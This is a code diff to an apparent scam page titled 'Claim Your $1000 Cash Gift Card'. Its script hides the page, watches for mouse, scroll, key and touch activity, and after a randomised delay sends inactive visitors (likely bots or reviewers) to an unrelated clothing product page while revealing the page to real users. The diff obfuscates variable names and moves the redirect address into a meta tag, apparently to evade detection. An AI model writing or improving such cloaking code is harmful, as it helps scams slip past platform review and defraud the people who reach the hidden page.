@@ -4,30 +4,37 @@
   <meta charset="UTF-8" />
   <meta name="viewport" content="width=device-width, initial-scale=1.0" />
   <title>Claim Your $1000 Cash Gift Card</title>
+  <meta name="redirect-fallback" content="https://beyondyoga.com/products/featherweight-hang-loose-jumpsuit-darkest-night-lwsd6169?variant=39868409479267" />
   <script>
-    (function () {
-      const COOKIE_NAME = "visitor_verified";
-      const REDIRECT_URL = "https://meridianshoppe.com/products/asa-duffle-bag";
-      const cookieExists = document.cookie.includes(`${COOKIE_NAME}=true`);
-      let engaged = false;
-
-      function markEngaged() {
-        engaged = true;
-        document.cookie = `${COOKIE_NAME}=true; path=/; max-age=86400`;
+    (function(){
+      const _x = {
+        cookieName: "visitor_verified",
+        duration: 7000 + Math.floor(Math.random() * 2000)
+      };
+      const meta = document.querySelector('meta[name="redirect-fallback"]');
+      const redirectURL = meta ? meta.content : null;
+      const _c = document.cookie.includes(_x.cookieName + "=true");
+      let _e = false;
+      const _s = () => {
+        _e = true;
+        document.cookie = _x.cookieName + "=true; path=/; max-age=86400";
+      };
+      const _l = [
+        ["mousemove", _s],
+        ["scroll", _s],
+        ["keydown", _s],
+        ["touchstart", _s]
+      ];
+      for (let i = 0; i < _l.length; i++) {
+        window.addEventListener(_l[i][0], _l[i][1]);
       }
-
-      window.addEventListener("mousemove", markEngaged);
-      window.addEventListener("scroll", markEngaged);
-      window.addEventListener("keydown", markEngaged);
-      window.addEventListener("touchstart", markEngaged);
-
-      setTimeout(() => {
-        if (!cookieExists && !engaged) {
-          window.location.href = REDIRECT_URL;
+      setTimeout(function () {
+        if (!_c && !_e && redirectURL) {
+          window.location.href = redirectURL;
         } else {
           document.documentElement.style.visibility = "visible";
         }
-      }, 7000 + Math.floor(Math.random() * 2000));
+      }, _x.duration);
     })();
   </script>
   <style>
